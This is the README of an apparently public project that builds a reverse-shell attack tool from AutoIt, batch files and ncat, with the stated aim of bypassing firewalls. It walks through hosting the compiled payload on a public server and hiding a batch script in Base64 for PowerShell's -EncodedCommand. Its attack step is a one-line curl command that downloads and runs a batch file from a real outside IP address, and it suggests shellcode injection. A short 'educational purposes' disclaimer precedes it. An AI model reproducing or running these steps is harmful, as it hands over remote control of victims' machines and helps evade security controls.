# Reverse Shell Attack

## Introduction

**Reverse Shell Attack** is a project written in AutoIt that establishes a TCP connection to perform a reverse shell. This project leverages AutoIt code alongside the `ncat` (Netcat) tool to create a listening server and handle remote connections, bypass firewall.

> ⚠️ **Warning**: This project is intended for educational purposes and penetration testing only. Unauthorized use of this code for malicious purposes is strictly prohibited and may have serious legal consequences. The user is fully responsible for how they use this tool.

---

## Features

- Establishes a reverse shell to connect remotely to a listening server.
- Utilizes TCP protocol for communication, managed through `ncat`.
- Enables remote system control via command-line interface.

---

## Technologies Used

This project incorporates the following technologies:

1. **AutoIt**:
   - The primary programming language used to write the code.
   - Known for its automation capabilities and system interaction.

2. **Batchfile**:
   - Used for supporting scripts and launching commands.

3. **Netcat (Ncat)**:
   - A powerful tool for creating TCP/IP connections.
   - Used to set up the listening server and manage shell communication.

---

## Getting Started

### Prerequisites

- **Ncat** or **Netcat** installed on your system.
- A host or server to hold file, make it public (or anything as long as it works with curl).

### Setup Instructions
1. **Setup AutoIt with function attack**:
- When done in SomeThing.au3, use Aut2Exe conver it to file .a3x.
- Chance HOST and PORT in SomeThing.au3 to your IP (public, not local).
2. **Ready env**:
- Move it to host or server, make it public (or anything as long as it works with curl). 
3. **Setup Bat file**:
* write batfile, example is ```MainScript.txt```. Chance IP, and write anything if you want.
* Convert to Base64 with:
`$fileContent = Get-Content -Raw -Path "YOUR PATH\MainScript.txt"; $base64Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fileContent))`
* $base64Encoded is your base64 code
* Make another bat file with script: `powershell.exe -EncodedCommand [your base64 code]`
4. **Ready to attack**:
* Save it, and mv to host. This is main bat file to attack. Example: ```HelloWord.bat```
5. **Attack**:
* Local attack by ```curl -O http://103.97.127.14/a.bat && a.bat && exit``` or convert to hex and attack with ShellCode Injection
* If you want to upgrade the au3 code, you can edit or add function to SomeThing.au3

---

## Contributing

Contributions to the project are welcome! If you have ideas for improvements or fixes, feel free to open a [pull request](https://github.com/tidzvl/Reverse-Shell-Attack/pulls) or create a [new issue](https://github.com/tidzvl/Reverse-Shell-Attack/issues).

---

## License

This project is licensed under the **MIT License**. See the `LICENSE` file for more details.

--- 

Feel free to suggest any modifications or additional sections you'd like to include!